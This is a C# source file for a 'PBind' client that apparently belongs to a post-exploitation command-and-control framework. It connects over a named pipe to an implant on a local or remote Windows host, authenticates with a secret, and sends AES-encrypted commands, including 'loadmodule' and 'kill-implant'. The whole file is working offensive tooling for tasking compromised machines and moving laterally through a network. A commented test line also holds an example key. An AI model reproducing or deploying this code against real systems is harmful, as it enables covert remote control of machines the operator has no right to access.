using System;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Security.Principal;
using System.Threading;

public class PBind
{
    private volatile static bool pbindConnected = false;
    private volatile static NamedPipeClientStream pipe;
    private volatile static StreamReader pipeReader;
    private volatile static StreamWriter pipeWriter;
    private static string encryptionKey = "";
    private static readonly object _lock = new object();

    public static void Main(string[] args)
    {
        Start(args);
        /*
        Start(new string[] { "Start", "ATHOMPSON", "PIPNAME", "SECRETNAME", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
        Console.ReadLine();
        Start(new string[] { "foo" });
        Console.ReadLine();
        Start(new string[] { "foo" });
        Console.ReadLine();
        Start(new string[] { "foo" });
        Console.ReadLine();
        Start(new string[] { "foo" });
        Console.ReadLine();
        */
    }

    /// <summary>
    /// Just a function that main can wrap for testing. 
    /// </summary>
    public static void Start(string[] args)
    {
        if (args.Length == 5 && args[0].ToLower() == "start") // If in format 'Start <hostname> <pipename> <secret> <key>'
        {
            if (pbindConnected)
            {
                Console.WriteLine("[-] PBind already connected");
            }
            else
            {
                var hostname = args[1];
                var pipename = args[2];
                var secret = args[3];
                encryptionKey = args[4];
                Console.WriteLine($"[+] Connecting to: {hostname} pipe: {pipename} with secret {secret} and key {encryptionKey}");
                pbindConnected = Connect(hostname, pipename, secret, encryptionKey);
            }

        }
        else if (pbindConnected)
        {
            string command = null;
            if (args[0].StartsWith("loadmodule") || args[0].StartsWith("kill-implant"))
            {
                command = args[0];
            } else {
                byte[] data = Convert.FromBase64String(args[0]);
                command = Encoding.UTF8.GetString(data);
            }
            if (command.ToLower().Trim() == "kill-implant")
            {
                pbindConnected = false;
                IssueCommand(command);
                pipe.Dispose();
            }
            else
            {
                IssueCommand(command);
            }
        }
        else
        {
            Console.WriteLine("[-] PBind not connected");
        }
    }

    /// <summary>
    /// Connects to the pipe with a timeout and reads target implant info if successful.
    /// </summary>
    /// 
    /// <returns>Returns true if the connection is successful and the response successfully decrypted, false otherwise</returns>
    public static bool Connect(string hostname, string pipeName, string secret, string encryptionKey)
    {

        if (hostname.ToString().ToLower() == "127.0.0.1" || hostname.ToString().ToLower() == "localhost")
        {
            pipe = new NamedPipeClientStream(pipeName);
        } 
        else
        {
            pipe = new NamedPipeClientStream(hostname, pipeName, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.Impersonation);
        }

        pipeReader = new StreamReader(pipe);
        pipeWriter = new StreamWriter(pipe);

        try
        {
            pipe.Connect(60000);
            pipeWriter.AutoFlush = true;
        } 
        catch (Exception e)
        {
            Console.WriteLine($"[-] Error connecting to pipe: {e.Message}");
            Console.WriteLine($"[-] {e.StackTrace}");
            return false;
        }

        if (pipe.CanWrite)
        {
            pipeWriter.WriteLine(secret);
        }
        else
        {
            Console.WriteLine("[-] Cannot write to pipe");
            return false;
        }

        if (pipe.CanRead)
        {
            try
            {
                var clientInfo = Decrypt(encryptionKey, pipeReader.ReadLine());
                if(!clientInfo.StartsWith("PBind-Connected"))
                {
                    Console.WriteLine($"[-] Error - decrypted response on pipe connect was invalid: {clientInfo}");
                    return false;
                }
                Console.WriteLine(clientInfo);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error decrypting response: {e.Message}");
                Console.WriteLine($"[-] {e.StackTrace}");
                return false;
            }
        }
        else
        { 
            Console.WriteLine("[-] Cannot read from pipe");
            return false;
        }
    }

    /// <summary>
    /// Will issue the specified command to the pipe and read the response
    /// </summary>
    public static void IssueCommand(string command)
    {
        // If the pipe is no longer connected then reset
        if (!pipe.IsConnected)
        {
            pbindConnected = false;
            Console.WriteLine("$[-] The PBind pipe is no longer connected");
            pipe.Dispose();
            return;
        }
        // Lock this so only one thread can read/write to the pipe at a time
        lock (_lock)
        {
            try
            {
                string line;

                line = pipeReader.ReadLine();
                var input = Decrypt(encryptionKey, line);
                if (input != "COMMAND")
                {
                    Console.Write("[-] Error, received unexpected response from target: " + input);
                }

                if (command.ToLower().Trim() == "kill-implant")
                {
                    var encrypted_output = Encrypt(encryptionKey, "KILL");
                    pipeWriter.WriteLine(encrypted_output);
                }
                else
                {
                    var encrypted_command = Encrypt(encryptionKey, command.ToString());
                    pipeWriter.WriteLine(encrypted_command);
                }

                line = pipeReader.ReadLine();
                if(line != null)
                {
                    input = Decrypt(encryptionKey, line);
                }
                else
                {
                    input = "";
                }

                Console.WriteLine(input);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in PBind Command Loop: {e.Message}");
                Console.WriteLine($"[-] {e.StackTrace}");
            }
        }
    }

    private static string Decrypt(string key, string ciphertext)
    {
        var rawCipherText = Convert.FromBase64String(ciphertext);
        var IV = new Byte[16];
        Array.Copy(rawCipherText, IV, 16);
        try
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
        }
        catch
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
        }
        finally
        {
            Array.Clear(rawCipherText, 0, rawCipherText.Length);
            Array.Clear(IV, 0, 16);
        }
    }

    private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
    {
        byte[] byEnc;
        if (unByte != null)
            byEnc = unByte;
        else
            byEnc = Encoding.UTF8.GetBytes(un);

        if (comp)
            byEnc = GzipCompress(byEnc);

        try
        {
            var a = CreateEncryptionAlgorithm(key, null);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
        catch
        {
            var a = CreateEncryptionAlgorithm(key, null, false);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
    }

    private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
    {
        SymmetricAlgorithm algorithm;
        if (rij)
            algorithm = new RijndaelManaged();
        else
            algorithm = new AesCryptoServiceProvider();

        algorithm.Mode = CipherMode.CBC;
        algorithm.Padding = PaddingMode.Zeros;
        algorithm.BlockSize = 128;
        algorithm.KeySize = 256;

        if (null != IV)
            algorithm.IV = Convert.FromBase64String(IV);
        else
            algorithm.GenerateIV();

        if (null != key)
            algorithm.Key = Convert.FromBase64String(key);

        return algorithm;
    }

    private static byte[] GzipCompress(byte[] raw)
    {
        using (MemoryStream memory = new MemoryStream())
        {
            using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
            {
                gzip.Write(raw, 0, raw.Length);
            }
            return memory.ToArray();
        }
    }

    private static byte[] CombineArrays(byte[] first, byte[] second)
    {
        byte[] ret = new byte[first.Length + second.Length];
        Buffer.BlockCopy(first, 0, ret, 0, first.Length);
        Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
        return ret;
    }

}


